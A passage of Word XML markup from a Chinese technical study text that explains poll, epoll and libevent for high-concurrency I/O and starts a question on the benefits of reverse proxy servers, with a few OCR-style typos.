        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int poll (struct pollfd *fds, nfds__t nfds, int timeout);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="314" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>思路：设计新的数据结构提供使用效函。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="314" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>问题：逐个排查所有文件句柄状态效率不高。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="735"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="314" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="50" w:name="bookmark56"/>
      <w:bookmarkEnd w:id="50"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>epoll</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="160" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>既然逐个排查所有文件句柄状态效率不高，很自然的，如果调用返回的时候只给应用提 供发生了状态变化(很可能是数据</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ready)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的文件句柄，进行排查的效率不就高多了么。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>epoll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>采用了这种设计，适用于大规模的应用场景。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>实验表明，当文件句柄数目超过10之后，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>epoll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>性能将优于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>poll;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>当文 件句柄数目达到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>10K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的时候，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>epoll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>已经超过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>poll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>两个数量级。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int epoll_wait（int epfd, struct epoll_event *events, int maxevents, int timeout）;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>思路：只返回状态变化的文件句柄。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>问题：依赖特定平台</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>（Linux）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="260" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>因为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Linux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是互联网企业中使用率最高的操作系统，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Epoll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>就成为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>C10K killer、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>高并 发、高性能、异步非阻塞这些技术的代名词了。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="726"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="51" w:name="bookmark57"/>
      <w:bookmarkEnd w:id="51"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>libevent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="480" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>由于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>epoll, kqueue, IOCP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>每个接口都有白己的特点，程序移植非常困难，于是需要对 这些接口进行封装，以让它们易于使用和移植，其中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>libevent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>库就是其中之一。跨平 台，封装底层平台的调用，提供统一的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>AH,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>但底层在不同平台上自动选择合适的调用。 按照</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>libevent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的官方网站，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>libevent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>库提供了以下功能：当一个文件描述符的特定事 件（如可读，可写或出错）发生了，或一个定时事件发生了，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>libevent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>就会自动执行 用户指定的回调函数，来处理事件。目前</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>,libevent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>已支持以下接口</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>/dev/poll, kqueue, event ports, select, poll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>epollo Libevent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的内部事件机制完全是基于所使用 的接口的。因此</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>libevent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>非常容易移植，也使它的扩展性非常容易。目前，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">libevent </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>已在以下操作系统中编译通过：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Linux, BSD, Mac OS X, Solaris</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Windows。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="416"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="52" w:name="bookmark60"/>
      <w:bookmarkEnd w:id="52"/>
      <w:bookmarkStart w:id="53" w:name="bookmark61"/>
      <w:bookmarkStart w:id="54" w:name="bookmark59"/>
      <w:bookmarkStart w:id="55" w:name="bookmark58"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>“反向</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>代理服务器”的优点是什么？</w:t>
      </w:r>
      <w:bookmarkEnd w:id="53"/>
      <w:bookmarkEnd w:id="54"/>
      <w:bookmarkEnd w:id="55"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="500"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>CD</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>提高访问速度</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>由于目标主机返回的数据会存在代理服务器的硬盘中，因此下一次客户再访问相同的站 点数据时，会直接从代理服务器的硬盘中读取，起到了緩存的作用，尤其对于热门站点 能明显提高请求速度。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
